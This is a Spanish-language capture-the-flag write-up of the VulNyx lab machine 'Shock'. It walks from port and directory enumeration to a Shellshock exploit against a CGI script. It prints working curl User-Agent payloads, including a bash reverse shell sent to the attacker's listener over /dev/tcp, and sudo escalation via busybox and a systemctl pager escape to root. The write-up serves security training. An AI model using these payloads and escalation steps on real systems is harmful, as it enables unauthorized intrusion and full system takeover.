# WriteUp: Shock | VulNyx

A continuación, presento el análisis y la resolución de la máquina **Shock** de la plataforma VulNyx. Mi proceso abarcó desde la fase de reconocimiento inicial hasta la escalada final de privilegios.

## Fase 1: Reconocimiento y Enumeración

Inicié mi análisis con una fase de reconocimiento, utilizando `nmap` para el descubrimiento de puertos abiertos en el objetivo.

```bash
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.28

PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

Posteriormente, realicé un escaneo más detallado sobre los puertos encontrados para identificar los servicios y sus versiones.

```bash
nmap -sVC -p21,22,80 192.168.56.28

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

## Fase 2: Enumeración del Servidor Web

Al inspeccionar el servicio web en el puerto 80, me encontré únicamente con una página estática que mostraba el mensaje "HelloWorld", sin ofrecer mayor información a simple vista.

![](Pasted%20image%2020251127015853.png)

Procedí a realizar una enumeración de directorios con `gobuster`, pero los resultados iniciales no fueron significativos.

```bash
gobuster dir -u http://192.168.56.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
# ... (output recortado) ...
/server-status        (Status: 403) [Size: 278]
===============================================================
```

Ante la falta de resultados con diversas listas de palabras, decidí cambiar mi estrategia y emplear los módulos de escaneo de Metasploit Framework. Utilicé `auxiliary/scanner/http/dir_scanner`.

```bash
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.56.28
RHOSTS => 192.168.56.28
msf6 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code...
[*] Using code '404' as not found for 192.168.56.28
[+] Found http://192.168.56.28:80/cgi-bin/ 403 (192.168.56.28)
[+] Found http://192.168.56.28:80/icons/ 403 (192.168.56.28)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Este escaneo reveló un directorio de interés: `/cgi-bin/`. El directorio `cgi-bin` es comúnmente utilizado en servidores Apache para alojar scripts ejecutables. Mi investigación me llevó a centrarme en este vector, sospechando que podría encontrar algún script vulnerable.

Mi siguiente acción fue realizar un ataque de fuerza bruta enfocado en el directorio `/cgi-bin/`, buscando scripts con extensiones comunes como `.cgi`, `.sh`, `.pl` y `.py`.

```bash
gobuster dir -u http://192.168.56.28/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x .cgi,.sh,.pl,.py -k -t 50

# ... (output recortado) ...
/shell.sh             (Status: 500) [Size: 611]
# ... (output recortado) ...
```

El resultado fue revelador: encontré el script `/cgi-bin/shell.sh`, que devolvía un código de estado **HTTP 500 (Internal Server Error)**. Esta respuesta a menudo indica un fallo en la ejecución del script en el lado del servidor, lo que puede ser un síntoma de una vulnerabilidad.

## Fase 3: Explotación (Shellshock)

Este escenario es un indicador clásico de la vulnerabilidad conocida como **Shellshock** (CVE-2014-6271). Procedí a confirmar y explotar esta vulnerabilidad enviando una cabecera `User-Agent` maliciosa a través de `curl` para ejecutar comandos.

```bash
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://192.168.56.28/cgi-bin/shell.sh

# Respuesta obtenida:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La respuesta confirmó la ejecución remota de comandos. El siguiente paso fue establecer una reverse shell para obtener acceso interactivo al sistema.

```bash
# En mi máquina de atacante, puse un listener con netcat
nc -lvnp 4444

# Envié el payload para la reverse shell:
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.22/4444 0>&1'" http://192.168.56.28/cgi-bin/shell.sh

# Conexión recibida en mi listener:
bash: cannot set terminal process group (496): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Fase 4: Escalada de Privilegios

**De `www-data` a `will`**

Una vez con acceso como el usuario `www-data`, mi siguiente objetivo fue la escalada de privilegios. Verifiqué los permisos de `sudo` asignados.

```bash
bash-4.3$ sudo -l
Matching Defaults entries for www-data on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on shock:
    (will) NOPASSWD: /usr/bin/busybox
```

Identifiqué que el usuario `www-data` puede ejecutar `/usr/bin/busybox` como el usuario `will` sin necesidad de contraseña. Utilicé este permiso para obtener una shell como dicho usuario.

```bash
bash-4.3$ sudo -u will /usr/bin/busybox sh
id
uid=1001(will) gid=1001(will) groups=1001(will)

# Mejoré la shell
bash -i
```

**De `will` a `root`**

Ahora como el usuario `will`, repetí el proceso de enumeración de permisos.

```bash
will@shock:~$ sudo -l
Matching Defaults entries for will on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User will may run the following commands on shock:
    (root) NOPASSWD: /usr/bin/systemctl
```

En esta ocasión, descubrí que `will` puede ejecutar `/usr/bin/systemctl` como `root`. La utilidad `systemctl`, cuando su salida es extensa, invoca un paginador como `less`. Estos paginadores a menudo permiten ejecutar comandos del sistema utilizando el carácter `!`. Aproveché esta funcionalidad para "escapar" del paginador y obtener una shell de `root`.

```bash
will@shock:~$ sudo -u root /usr/bin/systemctl
# Una vez dentro del paginador, escribí:
!/bin/bash
```

Al ejecutar el comando, se me otorgó una shell con privilegios elevados.

```bash
# Verifiqué mi identidad:
root@shock:~# id
uid=0(root) gid=0(root) groups=0(root)
```